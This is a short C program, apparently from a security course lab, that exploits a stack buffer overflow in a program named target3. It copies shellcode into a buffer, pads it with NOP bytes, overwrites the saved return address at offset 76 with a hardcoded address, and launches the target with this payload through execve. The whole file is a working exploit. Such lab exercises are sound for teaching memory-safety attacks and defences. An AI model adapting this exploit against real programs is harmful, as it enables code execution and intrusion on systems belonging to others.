#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

int
main ( int argc, char * argv[] )
{
    char *    args[3];
    char *    env[1];

    uint8_t input[370];
    memcpy(input, shellcode, sizeof(shellcode));
    for (int i = sizeof(shellcode) - 1; i < 76; i++) {
        input[i] = 0x90;
    }
    uint64_t *return_address = (uint64_t *) &input[76];
    *return_address = 0x40a4fe4c;

    args[0] = TARGET;
    args[1] = (char *) input;
    args[2] = NULL;

    env[0] = NULL;

    if ( execve (TARGET, args, env) < 0 )
        fprintf (stderr, "execve failed.\n");

    return (0);
}
